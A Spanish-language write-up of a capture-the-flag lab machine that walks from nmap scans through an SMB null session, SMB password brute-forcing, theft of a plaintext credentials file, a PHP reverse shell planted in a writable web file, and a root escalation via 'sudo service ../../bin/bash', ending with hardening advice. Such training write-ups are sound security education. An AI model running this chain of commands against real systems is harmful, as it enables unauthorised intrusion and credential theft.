# 🧾 INFORMACIÓN GENERAL

```text
┌────────────────────────────────────────────────────────────────────────────┐
│                          INFORMACIÓN GENERAL                               │
├────────────────────────────────────────────────────────────────────────────┤
│ Título del Pentest / Máquina : [allien]                                    │
│ Autor / Tester             : [fybersec]                                    │
│ Fecha de realización       : [**/01/2026]                                  │
│ Alcance del laboratorio    : [Máquinas / servicios / red]                  │
│ Objetivo del pentest       : Evaluar seguridad e identificar               │
│                              vulnerabilidades                              │
│ Notas adicionales          : [Laboratorio controlado]                      │
└────────────────────────────────────────────────────────────────────────────┘
```
# 🧠 Resumen Ejecutivo

Se identificó una mala configuración en SMB que permitió acceso no autenticado a recursos compartidos, lo que derivó en la exposición de credenciales y compromiso total del sistema.

Nivel de criticidad: 🔴 ALTO

# 🌐Reconocimiento
```
❯ ping -c 2 192.168.XX.XXX
PING 192.168.XX.XXX (192.168.XX.XXX) 56(84) bytes of data.
64 bytes from 192.168.XX.XXX: icmp_seq=1 ttl=64 time=4.72 ms
64 bytes from 192.168.XX.XXX: icmp_seq=2 ttl=64 time=4.31 ms

--- 192.168.XX.XXX ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 4.309/4.512/4.715/0.203 ms
```
ping envía paquetes ICMP para verificar si el host está activo.
El parámetro -c 2 limita el envío a 2 paquetes para no generar tráfico innecesario.

El host responde correctamente, lo que confirma conectividad.
Además, el TTL=64 sugiere que probablemente se trate de un sistema Linux, lo cual ya nos da contexto sobre posibles rutas de ataque y comportamiento del sistema.
# 🔍Escaneo de Nmap
```
❯ sudo nmap -sS -n -Pn --min-rate 5000 -p- --open 192.168.XX.XXX -oN allports
```
Se realiza un escaneo completo de los 65535 puertos TCP para no perder ningún servicio expuesto.

-sS → escaneo SYN (no completa el handshake TCP, por eso es más rápido y menos detectable)  
-n → evita resolución DNS  
-Pn → omite descubrimiento de host  
-p- → todos los puertos  
--open → muestra solo abiertos  
--min-rate 5000 → fuerza velocidad alta 
### Resultado
```
Host is up (0.0026s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
MAC Address: XX:XX:XX:XX:XX:XX
```
Esto ya define el enfoque: tenemos superficie web y también SMB, que muchas veces permite fuga de información o acceso lateral.

# 🧪Enumeración de servicios
```
❯ sudo nmap -sCV -n -Pn -p22,80,139,445 -oN services.txt 192.168.XX.XXX
```
-sC → ejecuta scripts de enumeración  
-sV → detecta versiones  

### Resultados importantes
```
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:a1:09:2d:be:05:58:1b:01:20:d7:d0:d8:0d:7b:a6 (ECDSA)
|_  256 cd:98:0b:8a:0b:f9:f5:43:e4:44:5d:33:2f:08:2e:ce (ED25519)
80/tcp  open  http        Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Login
|_http-server-header: Apache/2.4.58 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 5C:26:0A:84:B3:1C (Dell)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Host script results:
|_nbstat: NetBIOS name: SAMBASERVER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2026-04-01T13:10:20
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```
Dato importante:
SMB muestra "message signing enabled but not required", lo cual en entornos reales puede permitir ataques como relay, aunque en este caso no se explota directamente, pero se tiene en cuenta.

# 🌍Enumeración Web
Se accede al puerto 80 y se observa un login.

A simple vista no hay funcionalidad clara, no hay errores visibles ni mensajes útiles.
Se prueban credenciales básicas (admin:admin), pero no funcionan.

<p align="center">
  <img src="https://raw.githubusercontent.com/fybersec/cybersecurity-labs/main/dockerlabs/Imagenes/Login.png" width="600">
</p>

Esto sugiere:
- o el login no está conectado al backend
- o requiere credenciales válidas reales
- o el vector no está aquí directamente

# 🧬Fuzzing de directorios web
Se intenta descubrir rutas ocultas. 
```
❯ gobuster dir -u http://192.168.XX.XXX -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -x php,txt,ccs -t 64
```
### Resultado
```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.XX.XXX
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,ccs
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
info.php             (Status: 200) [Size: 76324]
index.php            (Status: 200) [Size: 3543]
```
Al acceder:
- index.php → corresponde al login
- info.php → no muestra funcionalidad visible

Se considera fuzzing más profundo (parámetros, wfuzz), pero tras varias pruebas no se encuentra comportamiento explotable.

Decisión:
👉 El vector web no es el punto de entrada inicial, se pivota a SMB.

# 📂Enumeración SMB

Se detecta que el servidor permite sesión nula (NULL session), lo cual es una mala configuración.
Shares:
```
❯ smbmap -H 192.168.XX.XXX

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 192.168.XX.XXX:445       Name: 192.168.X.XX             Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        myshare                                                 READ ONLY       Carpeta compartida sin restricciones
        backup24                                                NO ACCESS       Privado
        home                                                    NO ACCESS       Produccion
        IPC$                                                    NO ACCESS       IPC Service (EseEmeB Samba Server)
[*] Closed 1 connections 
```
Aca podemos usar tanto smbmap como smbclient para listar y extraer el contenido del share al que tenemos permisos con una NULL SESSION, en este caso usare smbclient para mayor movilidad y navegacion.
```
❯ smbclient //192.168.XX.XXX/myshare -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Oct  6 18:26:40 2024
  ..                                  D        0  Sun Oct  6 18:26:40 2024
  access.txt                          N      956  Sun Oct  6 02:46:26 2024

                55703752 blocks of size 1024. 14690820 blocks available
smb: \> get access.txt 
getting file \access.txt of size 956 as access.txt (233.4 KiloBytes/sec) (average 233.4 KiloBytes/sec)
smb: \> 
```
# 🔐ANÁLISIS DE ARCHIVOS (JWT)
Como podemos visualizar es un archivo codificado el cual tiene una peculiaridad, esta separado por puntos, al decodificar por completo el archivo ocurre esto:
```
❯ cat access.txt | base64 -d
{"alg":"RS256","typ":"JWT"}base64: entrada inválida
```
Podemos ver que dice entrada invalida, lo que hace pensar que base64 no hizo el trabajo completo sin embargo dio algo, lo que parece ser el header de un jason web token y al dividir los fragmentos del texto y decodificarlo obtenemos este resultado:
Se detecta que el contenido tiene formato de JSON Web Token (JWT).

Un JWT está compuesto por:
header.payload.signature

Se separa para analizar:
```
❯ cat access.txt | cut -d '.' -f1 | base64 -d
{"alg":"RS256","typ":"JWT"}%                                                                            
❯ cat access.txt | cut -d '.' -f2 | base64 -d
{"email":"satr*****@eseemeb.dl","role":"user","iat":1728160373,"exp":1728163973,"jwk":{"kty":"RSA","n":"*****
*****79803872624236127658661735535213165482642588849355546152257550066486603896883059896465194641335892535693
8040115243088184585341369542581540977233254141749773442890677866227752313386995705801734606415692539202779973
27388257555012007865347415523229000163852011155261549024296200826142870420167098445****","e":65**7}}%
```
Luego de identificar un usuario y su rol en el servidor visualizamos si es un usuario activo en el servicio smb y para esto usamos fuerza bruta con crackmapexec ya que es mas comodo trabajar con el servicio smb que la herramienta hydra 
# 🔓ACCESO INICIAL (FUERZA BRUTA SMB)
```
❯ crackmapexec smb 192.168.XX.XXX -u "satr*****" -p /usr/share/wordlists/rockyou.txt | grep -E "[+]"
SMB                      192.168.XX.XXX      445    SAMBASERVER      [+] SAMBASERVER\satr****:******

```
Luego de encontrar la clave de ese usuario usamos smbmap para identificar donde tiene permisos ese usuario en smb y vemos que tenemos permisos para el share llamado backup24.
### 📁 EXPLOTACIÓN SMB
```

❯ smbmap -H 192.168.XX.XXX -u 'satr****' -p '*******'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com 

[\] Enumerating shares...                                                                                                                                                                                           
[+] IP: 192.168.XX.XXX:445  Name: 192.168.XX.XXX                Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        myshare                                                 READ ONLY       Carpeta compartida sin restricciones
        backup24                                                READ ONLY       Privado
        home                                                    NO ACCESS       Produccion
        IPC$                                                    NO ACCESS       IPC Service (EseEmeB Samba Server)
[|] Closing connections..                                                      

```
Aca directamente podemos usar tanto como smbclient o smbmap para extraer archivos desde el servicio smb en este caso uso smbclient para mejarme dentro del servicio y asi encontrar justo lo que quiero con mayor rapidez. Dentro navegando por sus directorios encontre un directorio dentro de Documents/Personal donde se encontraban dos archivos uno notes.txt y el otro credenciales.txt y las traigo a y maquina local.
```
❯ smbclient //192.168.XX.XXX/backup24 -U 'satr*****'
Password for [WORKGROUP\satr*****]:
Try "help" to get a list of possible commands.
smb: \> cd Documents\Personal\
smb: \Documents\Personal\> get credentials.txt 
getting file \Documents\Personal\credentials.txt of size 902 as credentials.txt (440.4 KiloBytes/sec) (average 440.4 KiloBytes/sec)
smb: \Documents\Personal\> get notes.txt 
getting file \Documents\Personal\notes.txt of size 15 as notes.txt (4.9 KiloBytes/sec) (average 179.1 KiloBytes/sec)
smb: \Documents\Personal\> 
```
EL contenido de el archivo llamado credenciales.txt esta lleno de literalmente credenciales, usuarios y claves sin embargo optaremos por la opcion mas obvia que seria la de administrador.
```
File: credentials.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Archivo de credenciales
   2   │ 
   3   │ Este documento expone credenciales de usuarios, incluyendo la del usuario administrador.
   4   │ 
   5   │ Usuarios:
   6   │ -------------------------------------------------
   7   │ 1. Usuario: jsmith
   8   │    - Contraseña: ******!
   9   │ 
  10   │ 2. Usuario: abrown
  11   │    - Contraseña: *******!
  12   │ 
  13   │ 3. Usuario: lgarcia
  14   │    - Contraseña: ******!
  15   │ 
  16   │ 4. Usuario: kchen
  17   │    - Contraseña: *******!
  18   │ 
  19   │ 5. Usuario: tjohnson
  20   │    - Contraseña: *****!
  21   │ 
  22   │ 6. Usuario: emiller
  23   │    - Contraseña: ******!
  24   │    
  25   │ 7. Usuario: administrador
  26   │     - Contraseña: ********!  
:

```
Haremos la conexion por ssh con nuestro usuario administrador y su clave correspondiente y vemos que al entrar ejecuto bash para optener una bash ya que por defecto es una sh y puede ser un poco mas incomoda de trabajar sin embargo al ejecutar sudo -l no me deja, buscando en los archivos web di con el la ruta de /var/ww/html/info.php que ya el comando de gobuster lo habia captado y veo que tengo permisos de modificacion.
# 🖥️ACCESO POR SSH
```
❯ ssh administrador@192.168.XX.XXX
The authenticity of host '192.168.XX.XXX (192.168.XX.XXX)' can't be established.
ED25519 key fingerprint is: SHA256:**********FOFXdeWfqe7jMFBsD87m24Kd0mgHgS7Co
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.XX.XXX' (ED25519) to the list of known hosts.
administrador@192.168.XX.XXX's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.18.12+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro
$ bash
administrador@15419e28e31f:~$ 
[sudo] password for administrador: 
Sorry, user administrador may not run sudo on 15419e28e31f.
administrador@15419e28e31f:~$ cd /var/
administrador@15419e28e31f:/var$ cd www/
administrador@15419e28e31f:/var/www$ cd  html/
administrador@15419e28e31f:/var/www/html$ ls -l
total 476
-rw-r--r-- 1 root          root          463383 Oct  6  2024 back.png
-rw-r--r-- 1 root          root            3543 Oct  6  2024 index.php
-rwxrwxr-x 1 administrador administrador     21 Oct  6  2024 info.php
-rw-r--r-- 1 root          root            5229 Oct  6  2024 productos.php
-rw-r--r-- 1 root          root             263 Oct  6  2024 styles.css
```
# 💥EJECUCIÓN DE CÓDIGO (WEB SHELL)
Se identifica:

info.php → editable por el usuario administrador

Esto es importante porque permite ejecutar código en el contexto del servidor web.
Genero un rever shell con un generador de rever shell online el cual me proporciona el codigo y modifico el archivo info.php el cual tengo permisos y coloco el script dentro y me pongo en escuha por el puerto indicado, y luego acceso a la ruta /ip/info.php en la web y espero la rever shell 

<p align="center">
  <img src="https://raw.githubusercontent.com/fybersec/cybersecurity-labs/main/dockerlabs/Imagenes/Revershell.php.png" width="600">
</p>

Al acceder a la web espesificamente a la ruta que editamos y colocamos el script .php para obtener una shell y a la vez colocarnos en escucha obtnemos la session como www-data a partir de aqui hay que llegar a root de alguna forma 

<p align="center">
  <img src="https://raw.githubusercontent.com/fybersec/cybersecurity-labs/main/dockerlabs/Imagenes/info.php web.png" width="600">
</p>

```
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.XX.XXX] from (UNKNOWN) [192.168.XX.XXX] 48984
Linux 15419e28e31f 6.18.12+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.18.12-1kali1 (2026-02-25) x86_64 x86_64 x86_64 GNU/Linux
 04:44:15 up  8:39,  0 user,  load average: 2.60, 1.86, 1.23
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (25): Inappropriate ioctl for device
bash: no job control in this shell
www-data@15419e28e31f:/$
```
# 🚀 ESCALADA DE PRIVILEGIOS
Luego de ver si puedo ser root con el comando sudo -l obtenemos este resultado.
```
www-data@15419e28e31f:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on 15419e28e31f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on 15419e28e31f:
    (ALL) NOPASSWD: /usr/sbin/service
```
Entonces aqui nos ayudamos con recursos publicos para buscar informacion acerca de como se compromete este binario y encontramos
que se puede acprovechar un path traversal en el argumento, ya que el binario no sanitiza correctamente la ruta proporcionada. 
En lugar de limitarse a servicios válidos,interpreta la ruta relativa y termina resolviendo hacia:  /bin/bash
```
www-data@15419e28e31f:/$ sudo /usr/sbin/service ../../bin/bash
sudo /usr/sbin/service ../../bin/bash
id
uid=0(root) gid=0(root) grupos=0(root)
```
# 🎯 Cadena de ataque

1. Reconocimiento → Identificación de servicios
2. SMB NULL session → Acceso a share
3. Extracción de JWT → Enumeración de usuario
4. Fuerza bruta SMB → Credenciales válidas
5. Acceso a archivos → Credenciales en texto plano
6. Acceso SSH → Usuario administrador
7. Modificación web → Reverse shell
8. Escalada de privilegios → Root

# 🛡️ Recomendaciones

- Deshabilitar sesiones nulas en SMB
- No almacenar credenciales en texto plano
- Restringir permisos en archivos web
- Configurar correctamente sudoers
- Implementar controles de acceso y monitoreo
















